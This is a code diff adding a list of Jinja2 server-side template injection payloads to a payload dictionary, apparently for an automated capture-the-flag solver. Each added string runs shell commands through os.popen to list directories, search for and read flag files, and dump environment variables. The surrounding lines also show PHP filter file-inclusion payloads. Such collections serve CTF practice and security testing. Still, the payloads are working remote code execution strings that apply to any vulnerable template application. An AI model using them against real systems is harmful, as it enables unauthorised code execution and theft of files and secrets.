@@ -134,6 +134,25 @@ PAYLOADS: dict[str, list[str | tuple[str, str]]] = {
         "{{cycler.__init__.__globals__.os.popen('id').read()}}",
         "{{joiner.__init__.__globals__.os.popen('id').read()}}",
     ],
+    # SSTI exploration payloads - RCE commands to discover flag location
+    # NOTE: These payloads require confirmed SSTI. Run ALL to explore the system.
+    "ssti_explore": [
+        # List directories to find flag location (start with root)
+        "{{lipsum.__globals__['os'].popen('ls -la /').read()}}",
+        # Common CTF flag directories
+        "{{lipsum.__globals__['os'].popen('ls -la /challenge 2>/dev/null || ls -la /app 2>/dev/null').read()}}",
+        "{{lipsum.__globals__['os'].popen('ls -la /home 2>/dev/null').read()}}",
+        # Quick flag file search (limited to avoid timeout)
+        "{{lipsum.__globals__['os'].popen('find /challenge /app /home /tmp -name \"*flag*\" 2>/dev/null | head -5').read()}}",
+        # Direct flag read attempts (common locations)
+        "{{lipsum.__globals__['os'].popen('cat /challenge/flag 2>/dev/null || cat /flag.txt 2>/dev/null || cat /app/flag 2>/dev/null').read()}}",
+        # Environment variables (flags sometimes stored there)
+        "{{lipsum.__globals__['os'].popen('env | grep -i flag').read()}}",
+        # System info for context
+        "{{lipsum.__globals__['os'].popen('pwd && id').read()}}",
+        # Alternative RCE methods (in case lipsum doesn't work)
+        "{{cycler.__init__.__globals__.os.popen('ls -la / && ls -la /challenge 2>/dev/null').read()}}",
+    ],
     "lfi": [
         "php://filter/convert.base64-encode/resource=index.php",
         "php://filter/convert.base64-encode/resource=flag.php",
